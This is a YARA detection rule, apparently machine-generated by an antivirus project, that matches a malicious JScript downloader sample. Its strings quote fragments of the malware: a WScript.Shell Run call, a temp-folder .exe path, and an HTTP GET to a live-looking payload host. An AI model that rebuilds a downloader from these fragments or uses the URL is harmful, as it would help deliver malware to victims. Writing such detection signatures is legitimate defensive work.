rule sig_20160328_83d67c3958a56d4b61bc2a6c09c5e183 {
  meta:
    description = "datamaliciousorder - file 20160328_83d67c3958a56d4b61bc2a6c09c5e183.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "caad8f6c10f8433f19b22bb30a1d5f33ccdbfe54cd4aa0af83390d3ca465f8e1"

  strings:
    $s1  = "function Ttjnj() {return Veqsb[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"5Kr5yn5r6.exe\";};" fullword ascii
    $s2  = "Bixnmv[Rvkyhopmwg](\"GET\", \"http://dukeplasticslab.com/j47akfa\", false);" fullword ascii
    $s3  = "do {WScript[Llhjtmvtyg](Qcjbck() * 11)} while (Bixnmv[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Veqsb = function Uoifxzw() {return WScript[Eufvwwp](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Axnbegeby(Jmlzvpp, Zhurdie){return Jmlzvpp - Zhurdie;};" fullword ascii
    $s6  = "function Xdafowaz(Tlyyncedi){Veqsb[\"Run\"](Tlyyncedi, Ygntbd, Ygntbd);};" fullword ascii
    $s7  = "function Vtsybym() {return ((Rhugdvtyee == true) && (Rhugdvtyee == Lhzvijh)) ? 1 : Ygntbd;};" fullword ascii
    $s8  = "return Axnbegeby(Detddye, Bpjxrg);" fullword ascii
    $s9  = "Lhzvijh = true; " fullword ascii
    $s10 = "function Jtbyrc(Ivegiz) {var Irqtzfp = (1, 2, 3, 4, 5, Ivegiz); return Irqtzfp;};" fullword ascii
    $s11 = "function Qcjbck(){return 22;};" fullword ascii
    $s12 = "function Sidko(){return Uufbvqhgaw;};" fullword ascii
    $s13 = "Rhugdvtyee = true; " fullword ascii
    $s14 = "function Apllfdxk(){return Eufvwwp;};" fullword ascii
    $s15 = "var Lhzvijh = false;" fullword ascii
    $s16 = "var Etsdclfc = new this[\"Date\"]();" fullword ascii
    $s17 = "var Rhugdvtyee = false;" fullword ascii
    $s18 = " while (Jxxpovdiu){" fullword ascii
    $s19 = "function Wabrti()" fullword ascii
    $s20 = "} catch(Yysfok){Jxxpovdiu = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}